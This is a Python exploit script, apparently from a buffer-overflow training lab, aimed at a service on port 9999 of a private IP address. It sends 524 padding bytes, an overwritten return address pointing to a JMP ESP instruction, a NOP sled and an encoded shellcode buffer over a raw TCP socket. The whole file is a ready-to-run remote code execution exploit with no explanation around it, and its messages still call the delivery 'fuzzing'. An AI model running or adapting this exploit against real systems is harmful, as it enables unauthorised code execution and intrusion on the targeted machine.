#!/usr/bin/env python3

import socket
import time
import sys

ip = "192.168.0.105"
port = 9999
timeout = 5
prefix = ""
storage = 460
#jmp_esp 311712F3

buf =  b""
buf += b"\xdb\xc5\xbe\xed\x7b\xa3\x8f\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x52\x31\x77\x17\x83\xc7\x04\x03\x9a"
buf += b"\x68\x41\x7a\x98\x67\x07\x85\x60\x78\x68\x0f\x85"
buf += b"\x49\xa8\x6b\xce\xfa\x18\xff\x82\xf6\xd3\xad\x36"
buf += b"\x8c\x96\x79\x39\x25\x1c\x5c\x74\xb6\x0d\x9c\x17"
buf += b"\x34\x4c\xf1\xf7\x05\x9f\x04\xf6\x42\xc2\xe5\xaa"
buf += b"\x1b\x88\x58\x5a\x2f\xc4\x60\xd1\x63\xc8\xe0\x06"
buf += b"\x33\xeb\xc1\x99\x4f\xb2\xc1\x18\x83\xce\x4b\x02"
buf += b"\xc0\xeb\x02\xb9\x32\x87\x94\x6b\x0b\x68\x3a\x52"
buf += b"\xa3\x9b\x42\x93\x04\x44\x31\xed\x76\xf9\x42\x2a"
buf += b"\x04\x25\xc6\xa8\xae\xae\x70\x14\x4e\x62\xe6\xdf"
buf += b"\x5c\xcf\x6c\x87\x40\xce\xa1\xbc\x7d\x5b\x44\x12"
buf += b"\xf4\x1f\x63\xb6\x5c\xfb\x0a\xef\x38\xaa\x33\xef"
buf += b"\xe2\x13\x96\x64\x0e\x47\xab\x27\x47\xa4\x86\xd7"
buf += b"\x97\xa2\x91\xa4\xa5\x6d\x0a\x22\x86\xe6\x94\xb5"
buf += b"\xe9\xdc\x61\x29\x14\xdf\x91\x60\xd3\x8b\xc1\x1a"
buf += b"\xf2\xb3\x89\xda\xfb\x61\x1d\x8a\x53\xda\xde\x7a"
buf += b"\x14\x8a\xb6\x90\x9b\xf5\xa7\x9b\x71\x9e\x42\x66"
buf += b"\x12\x03\x40\xa8\x30\x2b\x67\x28\x1d\x8d\xee\xce"
buf += b"\x37\xde\xa6\x59\xa0\x47\xe3\x11\x51\x87\x39\x5c"
buf += b"\x51\x03\xce\xa1\x1c\xe4\xbb\xb1\xc9\x04\xf6\xeb"
buf += b"\x5c\x1a\x2c\x83\x03\x89\xab\x53\x4d\xb2\x63\x04"
buf += b"\x1a\x04\x7a\xc0\xb6\x3f\xd4\xf6\x4a\xd9\x1f\xb2"
buf += b"\x90\x1a\xa1\x3b\x54\x26\x85\x2b\xa0\xa7\x81\x1f"
buf += b"\x7c\xfe\x5f\xc9\x3a\xa8\x11\xa3\x94\x07\xf8\x23"
buf += b"\x60\x64\x3b\x35\x6d\xa1\xcd\xd9\xdc\x1c\x88\xe6"
buf += b"\xd1\xc8\x1c\x9f\x0f\x69\xe2\x4a\x94\x89\x01\x5e"
buf += b"\xe1\x21\x9c\x0b\x48\x2c\x1f\xe6\x8f\x49\x9c\x02"
buf += b"\x70\xae\xbc\x67\x75\xea\x7a\x94\x07\x63\xef\x9a"
buf += b"\xb4\x84\x3a"

string = b"A" * 524 + b'\xf3\x12\x17\x31' + b"\x90" * 16 + buf

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(string)
        s.recv(1024)
except Exception as e:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    print("Error:", str(e))
    sys.exit(0)

time.sleep(1)
